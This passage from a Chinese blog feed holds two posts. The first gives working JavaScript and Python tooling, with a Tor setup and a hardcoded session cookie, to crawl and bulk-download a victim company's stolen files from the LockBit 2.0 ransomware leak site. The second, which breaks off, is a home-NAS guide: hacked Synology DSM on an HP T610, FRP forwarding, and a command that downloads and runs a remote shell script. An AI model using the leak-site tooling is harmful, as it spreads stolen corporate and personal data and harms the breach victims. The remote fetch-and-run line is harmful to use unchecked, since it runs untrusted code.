        <content type="html"><![CDATA[<h2 id="LockBit2-0"><a href="#LockBit2-0" class="headerlink" title="LockBit2.0"></a>LockBit2.0</h2><p>LockBit 是一种采用强大的加密算法来使用户付费的加密病毒. 它使用各种分发方法来渗透目标计算机，例如垃圾邮件活动。, 网络钓鱼站点, 软件漏洞, 还是假的更新. 一旦进入, 它启动扫描过程以查找某些可能对用户有价值的文件类型 (相片, 视频和音频文件, 文件, 压缩文件, 等等). 然后, 病毒会对所有找到的文件进行编码，以便在解密之前无法访问它们. 获取解密软件, 受害者被要求支付加密货币赎金. 然而, 我们不建议您与这类人联系, 因为它可能导致欺诈或第二次病毒攻击. </p><p>LockBit2.0 会公开数据以威胁企业，但公开的数据不支持批量及打包下载，只能自己下载。并且公开的地址在暗网中，因此本文使用 JavaScript 爬取所有文件夹及文件路径（因为浏览器上运行比Python脚本快。。。），在使用Python批量创建目录并下载。</p><h2 id="爬取文件夹及文件名"><a href="#爬取文件夹及文件名" class="headerlink" title="爬取文件夹及文件名"></a>爬取文件夹及文件名</h2><p>对网页接口进行分析，写出以下脚本，直接在控制台中运行</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">dir_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>file_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>count_http <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">function</span> <span class="token function">htmlDecodeByRegExp</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>          s <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">"&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;gt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">"&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;nbsp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;#39;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">"\'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;quot;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> s<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">listdir</span><span class="token punctuation">(</span><span class="token parameter">path<span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>otherpage<span class="token operator">=</span><span class="token number">0</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>count_http <span class="token operator">=</span> count_http <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">var</span> settings <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">"url"</span><span class="token operator">:</span> <span class="token string">"http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion/ajax/listing-post"</span><span class="token punctuation">,</span>  <span class="token string">"method"</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>  <span class="token string">"timeout"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token operator">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span>    <span class="token string">"Accept-Language"</span><span class="token operator">:</span> <span class="token string">"en-US,en;q=0.5"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded; charset=UTF-8"</span><span class="token punctuation">,</span>    <span class="token string">"X-Requested-With"</span><span class="token operator">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token string">"data"</span><span class="token operator">:</span> <span class="token string">"explorer=true&amp;sub_path=&amp;split_idx="</span><span class="token operator">+</span>index<span class="token operator">+</span><span class="token string">"&amp;folder_id=1130&amp;full_path="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span>settings<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  res <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// console.log(res);</span>  data <span class="token operator">=</span> res<span class="token punctuation">.</span>file_list<span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>files_amount <span class="token operator">&gt;</span> <span class="token number">14</span> <span class="token operator">&amp;&amp;</span> otherpage <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">14</span> <span class="token operator">&lt;</span> res<span class="token punctuation">.</span>files_amount<span class="token punctuation">)</span><span class="token punctuation">{</span>count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token function">listdir</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> count<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span>pathname <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">data-dir=\"(.*?)\"&gt;</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>pathname <span class="token operator">=</span> <span class="token function">htmlDecodeByRegExp</span><span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>pathname <span class="token operator">=</span> pathname<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/ </span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">"\/"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"file__name--folder"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>dir_list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token function">listdir</span><span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>file_list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token comment">// console.log(file_list.length)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file_list<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>res <span class="token operator">=</span> <span class="token function">listdir</span><span class="token punctuation">(</span><span class="token string">"/pwmaadfile01"</span><span class="token punctuation">)</span></code></pre><p>爬取完成后， 右键复制元素将dir_list 和 file_list 保存到文件中（json格式）</p><p>这里有个小技巧，打开页面后下方的 数字即所有文件的总数</p><p><img src="/assets/image-20220226091736055.png" alt="image-20220226091736055"></p><h2 id="安装-Tor代理"><a href="#安装-Tor代理" class="headerlink" title="安装 Tor代理"></a>安装 Tor代理</h2><ol><li>安装Tor浏览器，就会在 127.0.0.1:9150 上起一个socks代理端口 </li><li>安装 Tor ，代理端口为 9050</li></ol><p>以centos为例：</p><pre class="language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> epel-releaseyum <span class="token function">install</span> tor</code></pre><p>配置科学上网 ，如果是 V2[]Ray， 需要在服务端，将 sniffing 设置为 false</p><p>如果服务器本身在国外（建议这种方式，直接在国外服务器上进行下载速度更快），可直接开启 tor</p><pre class="language-none"><code class="language-none">tor --hash-password mypassword# 修改配置vi /etc/tor/torrc# 修改或新增以下配置，也可不修改Socks5Proxy 127.0.0.1:1080 #通过代理连接ExcludeNodes {cn},{hk},{mo},{kp},{ir},{sy},{pk},{cu},{vn} #屏蔽某些节点strictnodes 1 # 严格节点模式ControlPort 9051 # 指定端口HashedControlPassword [密码] # 填入上一步获得的密码MaxCircuitDirtiness 10 # 设置更换ip的频率SOCKSPort 9050 # Default: Bind to localhost:9050 for local connections.  SOCKSPort 0.0.0.0:9150 # Bind to this address:port too.# 运行systemctl start tor# 查看日志，是否100%done，表示成功journalctl -f -o cat -u tor#检查端口ss -antp</code></pre><h2 id="批量创建目录并下载"><a href="#批量创建目录并下载" class="headerlink" title="批量创建目录并下载"></a>批量创建目录并下载</h2><p>使用Python批量创建目录 并下载，但当前需要注意 ，Session半个小时会失效（无论网络是否活动），因此需要每半个小时替换Session。</p><p>并且需要升级 requests模块到支持 socks的版本 <code>pip3 install requests[socks]</code></p><p>Tips： 此处需要使用 socks5h 才能支持通过 代理解析域名，普通的socks5 不会通过代理解析域名。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token comment"># pip install requests[socks]</span><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'socks5h://127.0.0.1:9150'</span><span class="token punctuation">,</span> <span class="token string">'https'</span><span class="token punctuation">:</span> <span class="token string">'socks5h://127.0.0.1:9150'</span><span class="token punctuation">}</span>Cookie <span class="token operator">=</span> <span class="token string">'res=5F431B0E27E2CCDD4681EB38C7AB6811DFE6E93E41917; PHPSESSID=2n13bfpq195uhdokquul3vb87m'</span><span class="token keyword">def</span> <span class="token function">creat_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"dirnames.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        dirs <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>        <span class="token keyword">for</span> d <span class="token keyword">in</span> dirs<span class="token punctuation">:</span>            os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">downloadfiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"peter.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        files <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>        count <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>            sysfile <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>sysfile<span class="token punctuation">)</span><span class="token punctuation">:</span>                count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>                <span class="token keyword">continue</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start download: {}/{} ==&gt; {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            downloadlink <span class="token operator">=</span> <span class="token string">"http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion/ajax/listing-post?file-download=true&amp;folder-id=1130&amp;data-dir="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>html<span class="token punctuation">.</span>unescape<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            headers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'</span><span class="token punctuation">,</span>                <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span>                <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>                <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion/post/2tlXutWhY9uckIv2620ab34bc0764'</span><span class="token punctuation">,</span>                <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>                <span class="token string">'Cookie'</span><span class="token punctuation">:</span> Cookie<span class="token punctuation">,</span>                <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>                <span class="token string">'Sec-Fetch-Dest'</span><span class="token punctuation">:</span> <span class="token string">'document'</span><span class="token punctuation">,</span>                <span class="token string">'Sec-Fetch-Mode'</span><span class="token punctuation">:</span> <span class="token string">'navigate'</span><span class="token punctuation">,</span>                <span class="token string">'Sec-Fetch-Site'</span><span class="token punctuation">:</span> <span class="token string">'same-origin'</span><span class="token punctuation">,</span>                <span class="token string">'Sec-Fetch-User'</span><span class="token punctuation">:</span> <span class="token string">'?1'</span><span class="token punctuation">,</span>                <span class="token string">'Pragma'</span><span class="token punctuation">:</span> <span class="token string">'no-cache'</span><span class="token punctuation">,</span>                <span class="token string">'Cache-Control'</span><span class="token punctuation">:</span> <span class="token string">'no-cache'</span>            <span class="token punctuation">}</span>            response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>downloadlink<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers <span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"session out time,please replace the active cookie, and delete the downloaded link."</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"current line number: {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sysfile<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> code<span class="token punctuation">:</span>                code<span class="token punctuation">.</span>write<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>            count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>sysfile <span class="token operator">+</span> <span class="token string">"====OK({}/{})"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment">#creat_dir()</span>    downloadfiles<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>首先执行  creat_dir() 函数 批量创建好目录， 再执行  downloadfiles() 函数进行下载</p><h2 id="监控Python脚本"><a href="#监控Python脚本" class="headerlink" title="监控Python脚本"></a>监控Python脚本</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token keyword">do</span><span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> -fe<span class="token operator">|</span><span class="token function">grep</span> download.py <span class="token operator">|</span><span class="token function">grep</span> -v <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">wc</span> -l<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">${count}</span> -lt <span class="token number">1</span> <span class="token punctuation">]</span><span class="token keyword">then</span>python3  download.py <span class="token operator">&amp;</span><span class="token keyword">else</span><span class="token builtin class-name">echo</span> <span class="token string">"runing....."</span><span class="token keyword">fi</span><span class="token function">sleep</span> <span class="token number">3</span><span class="token keyword">done</span></code></pre><h2 id="全自动化想法"><a href="#全自动化想法" class="headerlink" title="全自动化想法"></a>全自动化想法</h2><p>该网站使用了 Nginx-Lua-Anti-DDoS  做人机校验，实现原理是 让浏览器去计算一个复杂结果，表现为打开网站，展示 DDOS 页面，需要等待7秒后跳转到真正页面，之后会设置一个 有效 Session。</p><p>当前有两个想法：</p><ol><li>研究具体实现原理，实现直接Python请求获取有效Session</li><li>使用 selenium 模拟打开网站，等待浏览器获取到有效Session后，再通过selenium获取 Session值，返回给脚本。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Tor </tag>
            
            <tag> javascript </tag>
            
            <tag> darkweb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>惠普T610 安装黑群晖及其配置</title>
      <link href="/2022/02/18/hui-pu-t610-an-zhuang-hei-qun-hui-ji-qi-pei-zhi/"/>
      <url>/2022/02/18/hui-pu-t610-an-zhuang-hei-qun-hui-ji-qi-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><p>惠普T610 (6GRAM 16Gsata固态 1T2.5寸机械硬盘) 鼠标 键盘</p><p>工具软件：度盘链接(自行拼接): 1ahQQVfZXXWgoV_92-AWs7A 提取码: xtaa </p><p>本文将会介绍使用 16G sata 固态硬盘作为黑群晖引导，安装 6.1.7 的教程(6.2.2 多次尝试没装上！！烦死了)</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70.png" alt="img"></p><h1 id="1-制作引导"><a href="#1-制作引导" class="headerlink" title="1.制作引导"></a>1.制作引导</h1><p>引导可以使用U盘或者硬盘做，因为买的时候送了一块 16G的sata 小固态。本文使用USB及硬盘均尝试了进行引导。</p><p>需要的工具：分区大师DiskGenius_x86 芯片无忧ChipEasy-v1.620 ImageWriter Roadkils DiskImage </p><p>需要的资源：DSM_DS3617xs_15284.pat  ds3617_6.1.img</p><p>如果使用U盘进行引导，需先试用芯片无忧读取 u盘的 uid pid ，再用ImageWriter 写入镜像 ，最后修改 grub.cfg 文件的pid 等信息</p><p>如果使用硬盘做引导：则使用 Roadkils DiskImage 写入硬盘即可</p><p>具体写入引导过程不详细诉说，搜索相关帖子都能找到</p><h1 id="2-安装群晖系统"><a href="#2-安装群晖系统" class="headerlink" title="2.安装群晖系统"></a>2.安装群晖系统</h1><p>引导制作好后，将硬盘或USB插入惠普T610，开机，狂按delete键，会出现引导界面，选择第一项，回车。</p><p>接着使用群晖搜索，正常情况下会搜索到未安装的群晖，由于此处我已安装过，所以状态时已就绪。</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113602202.png" alt="img"></p><p> 进入网页，选择DSM_DS3617xs_15284.pat 文件进行安装。安装中会格式化另一块硬盘，安装完成后会自动重启。</p><h1 id="3-安装及配置"><a href="#3-安装及配置" class="headerlink" title="3.安装及配置"></a>3.安装及配置</h1><p>重启好了以后，安装 download station（后面会尝试下 玩物下载和迅雷内测的下载） 和 video station (做视频刮削器)</p><h2 id="配置video-station："><a href="#配置video-station：" class="headerlink" title="配置video station："></a>配置video station：</h2><p>配置 电影目录</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113602025.png" alt="img"></p><p>配置 刮削器 (勾选中文)</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113601576.png" alt="img"></p><p>配置刮削器 apikey，根据教程到 TMDB注册账号，申请apikey</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113601915.png" alt="img"></p><p>由于网络原因，需要手动修改hosts文件，才能正常访问到 TMDB，添加以下信息到/etc/hosts文件(需开启ssh登陆)</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">13.224</span>.161.90 api.themoviedb.org<span class="token number">13.226</span>.238.76 api.themoviedb.org</code></pre><p>效果如下：</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113602681.png" alt="img"></p><p>为了能在电视上也有这种海报的效果，电视上安装了群晖的DS video.apk 。据说有些用户安装后找不到图标，可以两个都安装DSVideo_Go_v1.0.1.apk AndroidTV-DSvideo.1.1.5-10054.apk </p><p>原本是想安装kodi的，但是家里的电视换了好多个版本都没法装上，要么闪退，要么说找不到存储卡。不想再折腾了，就直接安装 DS video ，效果也还行。刮削全靠nas上的dsvideo。</p><p> ios手机可安装 infuse (需要映射支持)</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="配置download-station："><a href="#配置download-station：" class="headerlink" title="配置download station："></a>配置download station：</h2><p>主要是下载时，需要增加以下tracker 地址，否则下载没速度。个人感觉下载没迅雷快。</p><p>tracker 列表获取：<a href="https://trackerslist.com/#/zh">XIU2/TrackersListCollection</a></p><p>如果想要手机上可以远程下载 安卓可安装 DSGET IOS的话目前好像只能用 DS Mobile (很久没更新的软件，但能用)，这个功能在外网使用时需要nas被外网访问，使用了自搭frp的方式临时实现。等以后有了公网IP，会采用DDNS 的方式实现。</p><p>BT搜索增强：</p><p>默认只有两个</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113601915-5155361.png" alt="img"></p><p>可下载大神提取的dlm文件导入  syno_search_fullpack.zip</p><h2 id="FRP端口映射配置："><a href="#FRP端口映射配置：" class="headerlink" title="FRP端口映射配置："></a>FRP端口映射配置：</h2><p>需要一台公网VPS 使用FRP项目 <a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a> </p><p>下载release、解压。</p><p>在vps上运行 frps -c frps.ini</p><p>在黑群晖上运行 frpc -c frpc.ini  添加 该命令到开机自启里面</p><p>具体原理此处不详细讲</p><pre class="language-none"><code class="language-none">#server 端[common] bind_port = 80 token = token dashboard_port = 7500dashboard_user = userdashboard_pwd = pass#client端[common]server_addr = 公网IPserver_port = 80token = token[dsm]type = tcplocal_ip = 127.0.0.1local_port = 5001remote_port = 443</code></pre><h2 id="transmission-安装配置"><a href="#transmission-安装配置" class="headerlink" title="transmission 安装配置"></a>transmission 安装配置</h2><p>玩物和download station 下载太恶心了，慢。</p><p>套件中，允许任何安装源，再添加套件来源 <a href="http://packages.synocommunity.com/">http://packages.synocommunity.com/</a></p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113601570.png" alt="img"></p><p>添加后，在社群中下载 transmission，下载完成后，使用ssh执行以下脚本(需F）Q，并且nas wget 好像有问题，第一个脚本直接从github下载没下下来)</p><pre class="language-none"><code class="language-none">wget https://github.com/ronggang/transmission-web-control/raw/master/release/install-tr-control-cn.shsh install-tr-control-cn.sh</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>安装完成后，在套件中心中重新启动 transmission ，界面改变</p><p><img src="/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyMTI2ODgx,size_16,color_FFFFFF,t_70-20220218113602033.png" alt="img"></p><p>7月23日更新</p><p>前面的都不好用，申请了迅雷内测版，果然舒服了</p><p>极米投影仪安装了kodi(为了好看皮肤安装了18.9 )，看来使用上还得改改。</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>本次安装仅这些内容，其中也踩了很多坑，取舍过后，采用这种方式搭建。</p><p>现在流程是： NAS上的迅雷 下载(坐等ios支持远程下载)，使用video statio 自动去TMDB刮削，刮不到就用电脑上的TMM手动刮。</p><p>电脑：直接用smb看了，不需要啥海报墙。</p><p>手机：ios使用 infuse PRO 6</p><p>普通电视：DS video (装不上kodi)</p><p>投影：kodi 18.9 （Aeon MQ8 